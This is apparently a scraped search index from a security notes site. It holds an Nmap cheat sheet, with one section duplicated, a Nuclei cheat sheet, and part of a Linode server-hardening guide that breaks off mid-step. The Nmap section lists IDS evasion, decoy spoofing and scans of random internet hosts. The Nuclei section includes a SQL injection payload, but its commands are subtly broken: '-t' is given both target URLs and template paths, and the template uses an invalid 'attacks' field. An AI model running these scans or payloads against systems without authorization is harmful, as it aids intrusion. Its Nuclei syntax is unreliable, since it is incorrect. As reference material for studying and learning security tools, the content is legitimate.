up"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#miscellaneous-nmap-flags","title":"Miscellaneous Nmap Flags","text":"SWITCH EXAMPLE **DESCRIPTION**** -6 nmap -6 2607:f0d0:1002:51::4 Enable IPv6 scanning -h nmap -h nmap help screen"},{"location":"cyberSecurity/Nmap%20Cheat%20Sheet%202024%20All%20the%20Commands%20%26%20Flags/#other-useful-nmap-commands","title":"Other Useful Nmap Commands","text":"*COMMAND* **DESCRIPTION**** nmap -iR 10 -PS22-25,80,113,1050,35000 -v -sn Discovery only on ports x, no port scan nmap 192.168.1.1-1/24 -PR -sn -vv Arp discovery only on local network, no port scan nmap -iR 10 -sn -traceroute Traceroute to random targets, no port scan nmap 192.168.1.1-50 -sL -dns-server 192.168.1.1 Query the Internal DNS for hosts, list targets only nmap 192.168.1.1 --packet-trace Show the details of the packets that are sent and received during a scan and capture the traffic. <p>You are only doing yourself a disservice by failing to learn and utilize all of Nmap\u2019s features. It is the first go-to tool you will use in the scanning and enumeration stage of many assessments, setting the foundation for the rest of your pentest. </p> <p>Keep a copy of this Nmap cheat sheet to refer back to, and consider our Complete Nmap Ethical Hacking Course. It, and many other ethical hacking courses, are available in our VIP Member\u2019s Section.</p>"},{"location":"cyberSecurity/nmapCheatsheet/","title":"Nmap Cheat Sheet 2024: All the Commands &amp; Flags","text":"<p>February 7, 2024 / By </p> <p>Nathan House</p> <p></p> <p>1.9k</p> <p>SHARES</p> <p>*\ue80c*Listen to the article</p> <p>The one downside to a tool as robust and powerful as Nmap is remembering so many commands. Even many seasoned industry professionals fail to make the most of Nmap simply because keeping track of all its flags can prove such a challenge.</p> <p>We have compiled and organized this Nmap cheat sheet to help you master what is arguably the most useful tool in any penetration tester\u2019s arsenal. Whether you use it to memorize Nmap\u2019s options, as a quick reference to keep nearby, or as a study sheet for your CEH/Pentest+ exam, we\u2019re certain it will help you become a Nmap pro.</p> <p>Download your own copy of this cheat sheet here. Now, let\u2019s get to the Nmap commands.</p>"},{"location":"cyberSecurity/nmapCheatsheet/#nmap-cheat-sheet-search","title":"Nmap Cheat Sheet Search","text":"<p>Search our Nmap cheat sheet to find the right cheat for the term you're looking for. Simply enter the term in the search bar and you'll receive the matching cheats available.</p>"},{"location":"cyberSecurity/nmapCheatsheet/#target-specification","title":"Target Specification","text":"SWITCH EXAMPLE **DESCRIPTION**** nmap 192.168.1.1 Scan a single IP nmap 192.168.1.1 192.168.2.1 Scan specific IPs nmap 192.168.1.1-254 Scan a range nmap scanme.nmap.org Scan a domain nmap 192.168.1.0/24 Scan using CIDR notation -iL nmap -iL targets.txt Scan targets from a file -iR nmap -iR 100 Scan 100 random hosts -exclude nmap -exclude 192.168.1.1 Exclude listed hosts"},{"location":"cyberSecurity/nmapCheatsheet/#nmap-scan-techniques","title":"Nmap Scan Techniques","text":"SWITCH EXAMPLE **DESCRIPTION**** -sS nmap 192.168.1.1 -sS TCP SYN port scan (Default) -sT nmap 192.168.1.1 -sT TCP connect port scan (Default without root privilege) -sU nmap 192.168.1.1 -sU UDP port scan -sA nmap 192.168.1.1 -sA TCP ACK port scan -sW nmap 192.168.1.1 -sW TCP Window port scan -sM nmap 192.168.1.1 -sM TCP Maimon port scan <p>Download the PDF Version of This NMAP Cheat Sheet!</p> <p>Want to keep this cheat sheet at your fingertips? Just enter your email address, and we\u2019ll send a PDF copy to your inbox.</p> <p>DOWNLOAD \u2192</p>"},{"location":"cyberSecurity/nmapCheatsheet/#host-discovery","title":"Host Discovery","text":"SWITCH EXAMPLE **DESCRIPTION**** -sL nmap 192.168.1.1-3 -sL No Scan. List targets only -sn nmap 192.168.1.1/24 -sn Disable port scanning. Host discovery only. -Pn nmap 192.168.1.1-5 -Pn Disable host discovery. Port scan only. -PS nmap 192.168.1.1-5 -PS22-25,80 TCP SYN discovery on port x. Port 80 by default -PA nmap 192.168.1.1-5 -PA22-25,80 TCP ACK discovery on port x. Port 80 by default -PU nmap 192.168.1.1-5 -PU53 UDP discovery on port x. Port 40125 by default -PR nmap 192.168.1.1-1/24 -PR ARP discovery on local network -n nmap 192.168.1.1 -n Never do DNS resolution"},{"location":"cyberSecurity/nmapCheatsheet/#nmap-command-generator","title":"Nmap Command Generator","text":"<p>Say goodbye to the hassle of trying to remember the exact syntax for your Nmap commands! With our Nmap Command Generator, you can simply say what you need Nmap to do and we will generate the command for you.</p> <p>Generate</p>"},{"location":"cyberSecurity/nmapCheatsheet/#port-specification","title":"Port Specification","text":"SWITCH EXAMPLE **DESCRIPTION**** -p nmap 192.168.1.1 -p 21 Port scan for port x -p nmap 192.168.1.1 -p 21-100 Port range -p nmap 192.168.1.1 -p U:53,T:21-25,80 Port scan multiple TCP and UDP ports -p nmap 192.168.1.1 -p- Port scan all ports -p nmap 192.168.1.1 -p http,https Port scan from service name -F nmap 192.168.1.1 -F Fast port scan (100 ports) -top-ports nmap 192.168.1.1 -top-ports 2000 Port scan the top x ports -p-65535 nmap 192.168.1.1 -p-65535 Leaving off initial port in range makes the scan start at port 1 -p0- nmap 192.168.1.1 -p0- Leaving off end port in range makes the scan go through to port 65535"},{"location":"cyberSecurity/nmapCheatsheet/#service-and-version-detection","title":"Service and Version Detection","text":"SWITCH EXAMPLE **DESCRIPTION**** -sV nmap 192.168.1.1 -sV Attempts to determine the version of the service running on port -sV -version-intensity nmap 192.168.1.1 -sV -version-intensity 8 Intensity level 0 to 9. Higher number increases possibility of correctness -sV -version-light nmap 192.168.1.1 -sV -version-light Enable light mode. Lower possibility of correctness. Faster -sV -version-all nmap 192.168.1.1 -sV -version-all Enable intensity level 9. Higher possibility of correctness. Slower -A nmap 192.168.1.1 -A Enables OS detection, version detection, script scanning, and traceroute"},{"location":"cyberSecurity/nmapCheatsheet/#os-detection","title":"OS Detection","text":"SWITCH EXAMPLE **DESCRIPTION**** -O nmap 192.168.1.1 -O Remote OS detection using TCP/IP stack fingerprinting -O -osscan-limit nmap 192.168.1.1 -O -osscan-limit If at least one open and one closed TCP port are not found it will not try OS detection against host -O -osscan-guess nmap 192.168.1.1 -O -osscan-guess Makes Nmap guess more aggressively -O -max-os-tries nmap 192.168.1.1 -O -max-os-tries 1 Set the maximum number x of OS detection tries against a target -A nmap 192.168.1.1 -A Enables OS detection, version detection, script scanning, and traceroute"},{"location":"cyberSecurity/nmapCheatsheet/#timing-and-performance","title":"Timing and Performance","text":"SWITCH EXAMPLE **DESCRIPTION**** -T0 nmap 192.168.1.1 -T0 Paranoid (0) Intrusion Detection System evasion -T1 nmap 192.168.1.1 -T1 Sneaky (1) Intrusion Detection System evasion -T2 nmap 192.168.1.1 -T2 Polite (2) slows down the scan to use less bandwidth and use less target machine resources -T3 nmap 192.168.1.1 -T3 Normal (3) which is default speed -T4 nmap 192.168.1.1 -T4 Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network -T5 nmap 192.168.1.1 -T5 Insane (5) speeds scan; assumes you are on an extraordinarily fast network"},{"location":"cyberSecurity/nmapCheatsheet/#timing-and-performance-switches","title":"Timing and Performance Switches","text":"SWITCH *EXAMPLE INPUT* *****DESCRIPTION***** -host-timeout  1s; 4m; 2h Give up on target after this long -min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout  1s; 4m; 2h Specifies probe round trip time -min-hostgroup/max-hostgroup &lt;size 50; 1024 Parallel host scan group sizes -min-parallelism/max-parallelism  10; 1 Probe parallelization -max-retries  3 Specify the maximum number of port scan probe retransmissions -min-rate  100 Send packets no slower than  per second -max-rate  100 Send packets no faster than  per second"},{"location":"cyberSecurity/nmapCheatsheet/#nse-scripts","title":"NSE Scripts","text":"SWITCH *EXAMPLE* *****DESCRIPTION***** -sC nmap 192.168.1.1 -sC Scan with default NSE scripts. Considered useful for discovery and safe -script default nmap 192.168.1.1 -script default Scan with default NSE scripts. Considered useful for discovery and safe -script nmap 192.168.1.1 -script=banner Scan with a single script. Example banner -script nmap 192.168.1.1 -script=http* Scan with a wildcard. Example http -script nmap 192.168.1.1 -script=http,banner Scan with two scripts. Example http and banner -script nmap 192.168.1.1 -script \"not intrusive\" Scan default, but remove intrusive scripts -script-args nmap -script snmp-sysdescr -script-args snmpcommunity=admin 192.168.1.1 NSE script with arguments"},{"location":"cyberSecurity/nmapCheatsheet/#useful-nse-script-examples","title":"Useful NSE Script Examples","text":"**COMMAND**** *****DESCRIPTION***** nmap -Pn -script=http-sitemap-generator scanme.nmap.org http site map generator nmap -n -Pn -p 80 -open -sV -vvv -script banner,http-title -iR 1000 Fast search for random web servers nmap -Pn -script=dns-brute domain.com Brute forces DNS hostnames guessing subdomains nmap -n -Pn -vv -O -sV -script smb-enum*,smb-ls,smb-mbenum,smb-os-discovery,smb-s*,smb-vuln*,smbv2* -vv 192.168.1.1 Safe SMB scripts to run nmap -script whois* domain.com Whois query nmap -p80 -script http-unsafe-output-escaping scanme.nmap.org Detect cross site scripting vulnerabilities nmap -p80 -script http-sql-injection scanme.nmap.org Check for SQL injections"},{"location":"cyberSecurity/nmapCheatsheet/#firewall-ids-evasion-and-spoofing","title":"Firewall / IDS Evasion and Spoofing","text":"SWITCH *EXAMPLE* *****DESCRIPTION***** -f nmap 192.168.1.1 -f Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters -mtu nmap 192.168.1.1 -mtu 32 Set your own offset size -D nmap -D 192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192.168.1.1 Send scans from spoofed IPs -D nmap -D decoy-ip1,decoy-ip2,your-own-ip,decoy-ip3,decoy-ip4 remote-host-ip Above example explained -S nmap -S www.microsoft.com www.facebook.com Scan Facebook from Microsoft (-e eth0 -Pn may be required) -g nmap -g 53 192.168.1.1 Use given source port number -proxies nmap -proxies http://192.168.1.1:8080, http://192.168.1.2:8080 192.168.1.1 Relay connections through HTTP/SOCKS4 proxies -data-length nmap -data-length 200 192.168.1.1 Appends random data to sent packets <p>Example IDS Evasion command</p> <p>nmap -f -t 0 -n -Pn --data-length 200 -D 192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192.168.1.1</p>"},{"location":"cyberSecurity/nmapCheatsheet/#output","title":"Output","text":"SWITCH *EXAMPLE* *****DESCRIPTION***** -oN nmap 192.168.1.1 -oN normal.file Normal output to the file normal.file -oX nmap 192.168.1.1 -oX xml.file XML output to the file xml.file -oG nmap 192.168.1.1 -oG grep.file Grepable output to the file grep.file -oA nmap 192.168.1.1 -oA results Output in the three major formats at once -oG - nmap 192.168.1.1 -oG - Grepable output to screen. -oN -, -oX - also usable -append-output nmap 192.168.1.1 -oN file.file -append-output Append a scan to a previous scan file -v nmap 192.168.1.1 -v Increase the verbosity level (use -vv or more for greater effect) -d nmap 192.168.1.1 -d Increase debugging level (use -dd or more for greater effect) -reason nmap 192.168.1.1 -reason Display the reason a port is in a particular state, same output as -vv -open nmap 192.168.1.1 -open Only show open (or possibly open) ports -packet-trace nmap 192.168.1.1 -T4 -packet-trace Show all packets sent and received -iflist nmap -iflist Shows the host interfaces and routes -resume nmap -resume results.file Resume a scan <p>Download the PDF Version of This NMAP Cheat Sheet!</p> <p>Want to keep this cheat sheet at your fingertips? Just enter your email address, and we\u2019ll send a PDF copy to your inbox.</p> <p>DOWNLOAD \u2192</p>"},{"location":"cyberSecurity/nmapCheatsheet/#helpful-nmap-output-examples","title":"Helpful Nmap Output examples","text":"**COMMAND**** *****DESCRIPTION***** nmap -p80 -sV -oG - -open 192.168.1.1/24 | grep open Scan for web servers and grep to show which IPs are running web servers nmap -iR 10 -n -oX out.xml | grep \"Nmap\" | cut -d \" \" -f5 &gt; live-hosts.txt Generate a list of the IPs of live hosts nmap -iR 10 -n -oX out2.xml | grep \"Nmap\" | cut -d \" \" -f5 &gt;&gt; live-hosts.txt Append IP to the list of live hosts ndiff scanl.xml scan2.xml Compare output from nmap using the ndif xsltproc nmap.xml -o nmap.html Convert nmap xml files to html files grep \" open \" results.nmap | sed -r \u2018s/ +/ /g\u2019 | sort | uniq -c | sort -rn | less Reverse sorted list of how often ports turn up"},{"location":"cyberSecurity/nmapCheatsheet/#miscellaneous-nmap-flags","title":"Miscellaneous Nmap Flags","text":"SWITCH EXAMPLE **DESCRIPTION**** -6 nmap -6 2607:f0d0:1002:51::4 Enable IPv6 scanning -h nmap -h nmap help screen"},{"location":"cyberSecurity/nmapCheatsheet/#other-useful-nmap-commands","title":"Other Useful Nmap Commands","text":"*COMMAND* **DESCRIPTION**** nmap -iR 10 -PS22-25,80,113,1050,35000 -v -sn Discovery only on ports x, no port scan nmap 192.168.1.1-1/24 -PR -sn -vv Arp discovery only on local network, no port scan nmap -iR 10 -sn -traceroute Traceroute to random targets, no port scan nmap 192.168.1.1-50 -sL -dns-server 192.168.1.1 Query the Internal DNS for hosts, list targets only nmap 192.168.1.1 --packet-trace Show the details of the packets that are sent and received during a scan and capture the traffic. <p>You are only doing yourself a disservice by failing to learn and utilize all of Nmap\u2019s features. It is the first go-to tool you will use in the scanning and enumeration stage of many assessments, setting the foundation for the rest of your pentest. </p> <p>Keep a copy of this Nmap cheat sheet to refer back to, and consider our Complete Nmap Ethical Hacking Course. It, and many other ethical hacking courses, are available in our VIP Member\u2019s Section.</p>"},{"location":"cyberSecurity/nuceli/","title":"Nuclei: Automating Web Application and Network Service Testing [Cheat Sheet]","text":"<p>Nuclei is an open-source framework designed for automating the detection and exploitation of vulnerabilities in web applications and other network services. It allows penetration testers and security researchers to define custom templates that specify a set of HTTP requests to send to a target, along with corresponding matching rules that can be used to identify vulnerabilities or misconfigurations.</p>"},{"location":"cyberSecurity/nuceli/#installation","title":"Installation","text":"<p>To install Nuclei, you can download the latest version from the official GitHub repository and follow the instructions</p>"},{"location":"cyberSecurity/nuceli/#cheat-sheet","title":"Cheat Sheet","text":"<p>here is a comprehensive cheat sheet with some commonly used Nuclei commands for bug bounty hunting:</p> <pre><code># Display help information\nnuclei -h\n\n# Display the current version of Nuclei\nnuclei -version\n\n# Load a list of targets from a file\nnuclei -l targets.txt -t ~/nuclei-templates/\n\n# Specify a single target to test\nnuclei -t https://example.com -t ~/nuclei-templates/\n\n# Specify a URL to test\nnuclei -u https://example.com -t ~/nuclei-templates/\n\n# Run Nuclei in silent mode (suppress output)\nnuclei -silent -t https://example.com -t ~/nuclei-templates/\n\n# Specify the number of concurrent threads to use\nnuclei -c 10 -t https://example.com -t ~/nuclei-templates/\n\n# Skip templates that require authentication\nnuclei -no-verify -t https://example.com -t ~/nuclei-templates/\n\n# Customize the output format of the Nuclei report\nnuclei -o output.txt -t https://example.com -t ~/nuclei-templates/\n\n# Ignore SSL certificate errors\nnuclei -insecure -t https://example.com -t ~/nuclei-templates/\n\n# Specify a custom HTTP header to include in requests\nnuclei -headers \"Authorization: Bearer TOKEN\" -t https://example.com -t ~/nuclei-templates/\n\n# Specify a custom user agent string to include in requests\nnuclei -user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -t https://example.com -t ~/nuclei-templates/\n</code></pre> <p>These commands should help you get started with running Nuclei and customizing your tests according to your specific needs. It\u2019s important to note that Nuclei supports many more commands and options beyond these, so be sure to consult the official documentation for more information.</p>"},{"location":"cyberSecurity/nuceli/#templates","title":"Templates","text":"<p>To create a template for Nuclei, follow these steps:</p> <ol> <li>Choose a target to test, such as a web application or network service.</li> <li>Identify a vulnerability or misconfiguration that you want to test for.</li> <li>Use the Nuclei template language to define the test. The template language is based on YAML syntax and supports a wide range of features, such as HTTP requests, response matching, and variables. Refer to the Nuclei documentation for more information on the template language and its features.</li> <li>Save the template to a file with a <code>.yaml</code> extension. It's recommended to save templates in a folder within the Nuclei templates directory for easier management and organization.</li> <li>Test the template by running Nuclei with the <code>-t</code> flag and specifying the path to the template file. For example:</li> </ol> <pre><code>nuclei -t https://example.com -t ~/nuclei-templates/my-template.yaml\n</code></pre> <p>Analyze the output to determine if the test was successful and if any vulnerabilities or misconfigurations were identified. Make changes to the template as necessary and repeat the testing process until you achieve the desired results.</p> <p>**Remember to test your templates carefully and responsibly, and always obtain permission from the target before conducting any vulnerability testing.*</p> <p>Custom Nuclei template SQL Injection script with explanations:</p> <pre><code>id: example-template   # A unique identifier for the template\ninfo:                   # Information about the template\n  name: Example Template\n  author: Your Name\n  severity: low\n\nrequests:               # List of HTTP requests to send\n  - method: GET         # HTTP method (GET, POST, etc.)\n    path: /             # Request path\n    headers:            # Optional request headers\n      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n    matchers:           # List of matchers to apply to the response\n      - type: word       # Matcher type (word, status, regex, etc.)\n        words:\n          - \"Example\"   # Keyword to search for in the response\n    attacks:            # Optional list of attack payloads to send\n      - payload: \"' OR true--\"\n</code></pre> <p>Explanation:</p> <ul> <li><code>id</code>: A unique identifier for the template that can be used to reference it in command-line arguments and other templates.</li> <li><code>info</code>: Metadata about the template, such as the name, author, and severity of the vulnerabilities or misconfigurations it tests for.</li> <li><code>requests</code>: A list of HTTP requests to send to the target. This section defines the HTTP method, path, headers, and other attributes of the requests. The requests can be customized further with variables, authentication credentials, and other features.</li> <li><code>matchers</code>: A list of matchers to apply to the response of the requests. The matchers define how to search for specific patterns or keywords in the response body or headers. Nuclei supports various types of matchers, such as word, regex, status, and binary.</li> <li><code>attacks</code>: An optional list of attack payloads to send in the requests. These payloads can be used to test for vulnerabilities such as SQL injection, XSS, and command injection. Nuclei supports various types of payloads, including file-based, parameter-based, and JSON-based.</li> </ul>"},{"location":"cyberSecurity/nuceli/#conclusion","title":"Conclusion","text":"<p>Nuclei is a powerful open-source tool that automates web application and network service vulnerability scanning. Its flexible and customizable approach allows users to create and use templates to identify vulnerabilities and misconfigurations. By using Nuclei with other tools, bug bounty hunters can streamline their testing workflows and improve security. Nuclei\u2019s development and community support make it a valuable tool for security testing.</p>"},{"location":"fail2ban/AdvancedSecOps/","title":"Guides - Setting Up and Securing a Compute Instance","text":"<p>Updated August 9, 2023, by Linode</p> <p>Linux virtual machines equipped with a tailored set of resources designed to run any cloud-based workload.</p> <p>After you have successfully created a Compute Instance, there are a few initial configuration steps you should perform within your new Linux system. This includes updating your system, setting the timezone, configuring a custom hostname, adding a limited user, hardening SSH to prevent unauthorized access, and configuring a firewall. These steps ensure your instance is up to date, secure, and ready for use.</p> <p>Note</p> <p>While this guide is optional, it walks you through best practices and covers important steps to secure your server. It is recommended that you follow these instructions when deploying a new Compute Instance. Some guides within our library assume that you have performed these steps, such as setting your hostname and updating your software.</p> <ol> <li>View your Instance in the Cloud Manager</li> <li>Connect to the Instance</li> <li>Perform System Updates</li> <li>Set the Timezone</li> <li>Configure a Custom Hostname</li> <li>Add a Limited User Account</li> <li>Harden SSH Access</li> <li>Configure a Firewall</li> <li>Common Lockout Recovery Steps</li> </ol>"},{"location":"fail2ban/AdvancedSecOps/#before-you-begin","title":"Before You Begin","text":"<p>If you haven\u2019t done so already, review the following guides to learn more about using Linode and Compute Instances.</p> <ul> <li>Getting Started with Linode</li> <li>Creating a Compute Instance</li> <li>Linode Beginner\u2019s Guide</li> </ul>"},{"location":"fail2ban/AdvancedSecOps/#view-your-instance-in-the-cloud-manager","title":"View your Instance in the Cloud Manager","text":"<p>Log in to the Cloud Manager, click the Linodes link in the left menu, and select your Compute Instance from the list. This opens the details page for that instance, which allows you to view key information and further configure it to meet your needs.</p> <p></p>"},{"location":"fail2ban/AdvancedSecOps/#connect-to-the-instance","title":"Connect to the Instance","text":"<p>Once the Compute Instance has been created and has finished booting up, you can connect to it. Connecting to your instance is usually done through the SSH (Secure Shell) protocol, though you can use the Lish Console to bypass SSH and connect directly to your instance. The Lish Console can be accessed through a web browser (Weblish) or via SSH on the command line.</p> <ul> <li> <p>Weblish (via the Cloud Manager): Click the Launch LISH Console link at the top right corner of the Compute Instance\u2019s detail page. See Using the Lish Console &gt; Through a Browser.</p> </li> <li> <p>SSH: Copy the command from the SSH Access field under the Access section on the Compute Instance\u2019s detail page (see screenshot above) and paste it into your local computer\u2019s terminal. The command should look similar to the following, only with the IP address of your newly created instance.</p> </li> </ul> <p><code>bash   ssh root@192.0.2.17</code></p> <ul> <li>Windows: Windows 10 and 11 users can connect to their Compute Instance using the Command Prompt (or PowerShell) application, provided their system is fully updated. For users of Windows 8 and earlier, Secure Shell on Chrome, PuTTY, or many other third party tools can be used instead. See Connecting to a Remote Server Over SSH on Windows.</li> <li>macOS: The Terminal application is pre-installed on macOS. See Connecting to a Remote Server Over SSH on a Mac.</li> <li> <p>Linux: You can use a terminal window, regardless of desktop environment or window manager. See Connecting to a Remote Server Over SSH on Linux</p> </li> <li> <p>Lish (via SSH): Copy the command from the LISH Console via SSH field under the Access section on the Compute Instance\u2019s detail page (see screenshot above) and paste it into your local computer\u2019s terminal. The command should look similar to the one below, only with your username, data center, and Compute Instance label. Review Using the Lish Console &gt; Through SSH for more instructions.</p> </li> </ul> <p><code>bash   ssh -t user@lish-newark.linode.com example-instance</code></p>"},{"location":"fail2ban/AdvancedSecOps/#perform-system-updates","title":"Perform System Updates","text":"<p>Updating your system frequently is the single biggest security precaution you can take for any operating system. Software updates range from critical vulnerability patches to minor bug fixes and many software vulnerabilities are actually patched by the time they become public. Updating also provides you with the latest software versions available for your distribution.</p> <p>Ubuntu, Debian, Kali LinuxCentOS/RHEL 8+, FedoraCentOS 7openSUSEAlpineArchGentooSlackware</p> <pre><code>apt update &amp;&amp; apt upgrade\n</code></pre> <p>Note</p> <p>When updating some packages, you may be prompted to use updated configuration files. If prompted, it is typically safer to keep the locally installed version.</p> <p>Note</p> <p>Linode\u2019s Kali Linux distribution image is a minimum installation. You will likely want to install individual tools or metapackages, such as the kali-linux-headless metapackage.</p>"},{"location":"fail2ban/AdvancedSecOps/#set-the-timezone","title":"Set the Timezone","text":"<p>All new Compute Instances are set to UTC time by default. However, you may prefer to use the time zone which you live in so log file timestamps are relative to your local time.</p> <p>Most DistributionsUbuntu, Debian, KaliAlpineGentooopenSUSESlackware</p> <p>This includes CentOS Stream 8 (and newer), CentOS 7 (and newer), other RHEL derivatives (including AlmaLinux 8 and Rocky Linux 8), Fedora, and Arch. These instructions also work for most Ubuntu, Debian, and openSUSE distributions, though other methods may be preferred in those cases.</p> <ol> <li>Use <code>timedatectl</code> to output a list of available timezones.</li> </ol> <p><code>bash    timedatectl list-timezones</code></p> <ol> <li> <p>Use the arrow keys, <code>Page Up</code>, and <code>Page Down</code> to navigate through the list. Copy or make note of your desired time zone and press q to exit the list.</p> </li> <li> <p>Set the time zone using the command below, replacing America/New_York with your preferred time zone.</p> </li> </ol> <p><code>bash    timedatectl set-timezone 'America/New_York'</code></p>"},{"location":"fail2ban/AdvancedSecOps/#check-the-time","title":"Check the Time","text":"<p>Use the <code>date</code> command to view the current date and time according to your server.</p> <pre><code>root@localhost:~# date\nThu Feb 16 12:17:52 EST 2018\n</code></pre>"},{"location":"fail2ban/AdvancedSecOps/#configure-a-custom-hostname","title":"Configure a Custom Hostname","text":"<p>A hostname is used to identify your Compute Instance using an easy-to-remember name. It can be descriptive and structured (detailing what the system is used for) or a generic word or phrase. Here are some examples of hostnames:</p> <ul> <li>Descriptive and/or Structured: <code>web</code>, <code>staging</code>, <code>blog</code>, or something more structured like <code>[purpose]-[number]-[environment]</code> (ex: <code>web-01-prod</code>).</li> <li>Generic/Series: Such as the name of a fruit (<code>apple</code>, <code>watermelon</code>), a planet (<code>mercury</code>, <code>venus</code>), or animal (<code>leopard</code>, <code>sloth</code>).</li> </ul> <p>This hostname can be used as part of a FQDN (fully qualified domain name) for the system (ex: <code>web-01-prod.example.com</code>).</p> <p>Most distributionsAlpineGentooSlackware</p> <p>This includes Ubuntu 16.04 (and newer), CentOS Stream 8 (and newer), CentOS 7 (and newer), other RHEL derivatives (including AlmaLinux 8 and Rocky Linux 8), Debian 8 (and newer), Fedora, openSUSE, Kali Linux, and Arch.</p> <p>Replace <code>example-hostname</code> with one of your choice.</p> <pre><code>hostnamectl set-hostname example-hostname\n</code></pre> <p>After you\u2019ve made the changes above, you may need to log out and log back in again to see the terminal prompt change from <code>localhost</code> to your new hostname. The command <code>hostname</code> should also show it correctly. See our guide on using the hosts file if you want to configure a fully qualified domain name.</p>"},{"location":"fail2ban/AdvancedSecOps/#update-your-systems-hosts-file","title":"Update Your System\u2019s <code>hosts</code> File","text":"<p>The <code>hosts</code> file creates static associations between IP addresses and hostnames or domains which the system prioritizes before DNS for name resolution.</p> <ol> <li>Open the <code>hosts</code> file in a text editor, such as Nano.</li> </ol> <p><code>bash    nano /etc/hosts</code></p> <ol> <li> <p>Add a line for your Compute Instance\u2019s public IP address. You can associate this address with your instance\u2019s Fully Qualified Domain Name (FQDN) if you have one, and with the local hostname you set in the steps above. In the example below, <code>203.0.113.10</code> is the public IP address, <code>example-hostname</code> is the local hostname, and <code>example-hostname.example.com</code> is the FQDN.</p> </li> <li> <p>File: /etc/hosts</p> <p><code>1 2 ``127.0.0.1 localhost.localdomain localhost 203.0.113.10 example-hostname.example.com example-hostname</code></p> </li> <li> <p>Add a line for your Compute Instance\u2019s IPv6 address. Applications requiring IPv6 will not work without this entry:</p> </li> <li> <p>File: /etc/hosts</p> <p><code>1 2 3 ``127.0.0.1 localhost.localdomain localhost 203.0.113.10 example-hostname.example.com example-hostname 2600:3c01::a123:b456:c789:d012 example-hostname.example.com example-hostname</code></p> </li> </ol> <p>The value you assign as your system\u2019s FQDN should have an \u201cA\u201d record in DNS pointing to your Compute Instance\u2019s IPv4 address. For IPv6, you should also set up a DNS \u201cAAAA\u201d record pointing to your instance\u2019s IPv6 address.</p> <p>See our guide to Adding DNS Records for more information on configuring DNS. For more information about the <code>hosts</code> file, see Using your System\u2019s hosts File</p>"},{"location":"fail2ban/AdvancedSecOps/#add-a-limited-user-account","title":"Add a Limited User Account","text":"<p>Up to this point, you have accessed your Compute Instance as the <code>root</code> user, which has unlimited privileges and can execute any command\u2013even one that could accidentally disrupt your server. We recommend creating a limited user account and using that at all times. Administrative tasks will be done using <code>sudo</code> to temporarily elevate your limited user\u2019s privileges so you can administer your server. Later, when you want to restrict sudo access for users, see Linux Users and Groups.</p> <p>Note</p> <p>Not all Linux distributions include <code>sudo</code> on the system by default, but all the images provided by Linode have sudo in their package repositories. If you get the output <code>sudo: command not found</code>, install sudo before continuing.</p> <p>Ubuntu, Debian, Kali LinuxCentOS/RHEL, Fedora</p> <ol> <li>Create the user, replacing <code>example_user</code> with your desired username. You\u2019ll then be asked to assign the user a password:</li> </ol> <p><code>bash    adduser example_user</code></p> <ol> <li>Add the user to the <code>sudo</code> group so you\u2019ll have administrative privileges:</li> </ol> <p><code>bash    adduser example_user sudo</code></p>"},{"location":"fail2ban/AdvancedSecOps/#log-in-as-the-new-user","title":"Log in as the New User","text":"<ol> <li>After creating your limited user, disconnect from your Compute Instance:</li> </ol> <p><code>bash    exit</code></p> <ol> <li>Log back in as your new user. Replace <code>example_user</code> with your username, and the example IP address with your instance\u2019s IP address:</li> </ol> <p><code>bash    ssh example_user@192.0.2.17</code></p> <p>Now you can administer your Compute Instance from your new user account instead of <code>root</code>. Nearly all superuser commands can be executed with <code>sudo</code> (example: <code>sudo iptables -L -nv</code>) and those commands will be logged to <code>/var/log/auth.log</code>.</p>"},{"location":"fail2ban/AdvancedSecOps/#harden-ssh-access","title":"Harden SSH Access","text":"<p>By default, password authentication is used to connect to your Compute Instance via SSH. A cryptographic key-pair is more secure because a private key takes the place of a password, which is generally much more difficult to decrypt by brute-force. In this section we\u2019ll create a key-pair and configure your system to not accept passwords for SSH logins.</p>"},{"location":"fail2ban/AdvancedSecOps/#create-and-upload-your-ssh-key","title":"Create and Upload Your SSH Key","text":"<p>To protect your user account with public key authentication, you first need to create an SSH key pair and upload the public key to your server.</p> <ol> <li> <p>Locate your existing SSH public key or, if you don\u2019t yet have one, create a new SSH key pair.</p> </li> <li> <p>If you have an existing SSH key, find the public key on your local machine. SSH keys are typically stored in a hidden <code>.ssh</code> directory within the user\u2019s home directory:</p> <ul> <li>Linux: <code>/home/username/.ssh/</code></li> <li>macOS: <code>/Users/username/.ssh/</code></li> <li>Windows: <code>C:\\Users\\Username\\.ssh\\</code></li> </ul> <p>Since SSH keys are generated as a private and public key pair, there should be two files for each SSH key. They have similar file names, with the public key using a <code>.pub</code> extension and the private key using no extension. While SSH keys can have custom file names, many people generate them using their default names. These default file names start with <code>id_</code> followed by the type of key, such as <code>id_rsa</code>, <code>id_ed25519</code>, and <code>id_ecdsa</code>. See example private and public key file names below:</p> <ul> <li>Private key: <code>id_ed25519</code></li> <li>Public key: <code>id_ed25519.pub</code></li> </ul> </li> <li> <p>If you do not yet have an SSH key pair, generate one now. We recommend using the Ed25519 algorithm with a secure passphrase. The command below works for Linux, macOS, and most fully updated Windows 10 and 11 machines. Replace <code>user@domain.tld</code> with your own email address or whatever custom comment string you wish to use. This helps with differentiate SSH keys and identify the owner.</p> <p><code>bash  ssh-keygen -t ed25519 -C \"user@domain.tld\"</code></p> <p>When prompted for the filename, you can press Enter to use the defaults. When prompted for the optional passphrase, we recommend using a string similar to a strong password (with a mix of letters, numbers, and symbols).</p> <p>For more detailed instructions, on creating an SSH key, review the Generate an SSH Key Pair guide. Users of Windows 7 and earlier should review the PuTTY section.</p> </li> <li> <p>Upload the public key to your Compute Instance. Replace <code>example_user</code> with the name of the user you plan to administer the server as and <code>192.0.2.17</code> with your instance\u2019s IP address.</p> </li> </ol> <p>LinuxmacOSWindows 10 or 11Earlier Windows Versions</p> <p>From your local computer:</p> <p><code>bash    ssh-copy-id example_user@192.0.2.17</code></p> <ol> <li>Finally, you\u2019ll want to set permissions for the public key directory and the key file itself. On your Compute Instance, run the following command:</li> </ol> 